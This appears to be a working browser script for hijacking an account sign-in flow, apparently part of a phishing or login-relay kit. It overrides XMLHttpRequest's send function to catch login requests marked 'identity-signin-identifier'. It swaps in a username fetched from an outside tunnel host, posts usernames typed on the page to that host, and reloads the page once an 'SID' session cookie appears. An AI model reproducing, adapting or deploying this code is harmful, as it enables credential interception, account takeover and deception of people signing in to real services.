let freqUsername = null;
const modifiedRequests = new Set();
const pendingRequests = new Map();

let usernameFetched = false;

// ✅ Fetch the username when needed
const fetchFreqUsername = async () => {
    if (usernameFetched) return; // Avoid redundant fetches
    console.log('Fetching username...');

    try {
        const response = await fetch(' https://o0b11t.mmar.dev/get-first-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();

        if (result?.postData) {
            freqUsername = result.postData;
            console.log('Fetched username:', freqUsername);
            usernameFetched = true;

            // ✅ Reset the server-side username store
            await fetch(' https://o0b11t.mmar.dev/reset-first-post-data', { method: 'POST' });

            // ✅ Process all pending requests now that we have a username
            processModifiedRequests();
        } else {
            console.warn("No username data received, retrying...");
            setTimeout(fetchFreqUsername, 1000);
        }
    } catch (error) {
        console.error('Error fetching username:', error);
        setTimeout(fetchFreqUsername, 1000); // Retry after 1s
    }
};

// ✅ Modify and send pending requests when username is available
const processModifiedRequests = () => {
    if (!freqUsername) {
        console.log("Username not available yet, retrying...");
        fetchFreqUsername();
        return;
    }

    for (let [xhr, body] of pendingRequests) {
        const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);

        if (match && !modifiedRequests.has(freqUsername)) {
            const modifiedBody = body.replace(match[1], freqUsername);
            modifiedRequests.add(freqUsername);
            
            console.log("Modified request with new username:", modifiedBody);
            xhr.send(modifiedBody);
            pendingRequests.delete(xhr); // ✅ Ensure request is removed after sending
        }
    }

    // ✅ Ensure `freqUsername` is not reset too early
    if (pendingRequests.size === 0) {
        freqUsername = null;
        usernameFetched = false; // Allow fetching a new username if needed
    }
};

// ✅ Intercept XMLHttpRequest to modify requests with username
const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    if (/identity-signin-identifier/.test(body) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
        console.log("Intercepted request:", body);
        pendingRequests.set(this, body);
        processModifiedRequests();
    } else {
        originalXhrSend.call(this, body);
    }
};

// ✅ Send username data to server
const sendUsername = () => {
    console.log('Sending username...');

    const username = document.getElementById('username')?.value;
    if (!username) {
        console.warn("No username entered");
        return;
    }

    fetch(' https://o0b11t.mmar.dev/save-username', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
    })
    .then(response => {
        if (response.ok) {
            console.log('Username sent successfully');
        } else {
            console.error('Error sending username:', response.statusText);
        }
    })
    .catch(error => console.error('Error sending username:', error));
};

// ✅ Attach event listeners to buttons
document.addEventListener('DOMContentLoaded', () => {
    const button = document.getElementById('sendUsernameBtn');
    if (button) {
        button.addEventListener('click', sendUsername);
    }

    // ✅ Fetch username immediately on page load
    fetchFreqUsername();
});

// ✅ Auto-refresh page if 'SID' cookie exists
setInterval(() => {
    if (document.cookie.includes('SID')) {
        location.reload();
    }
}, 3000);
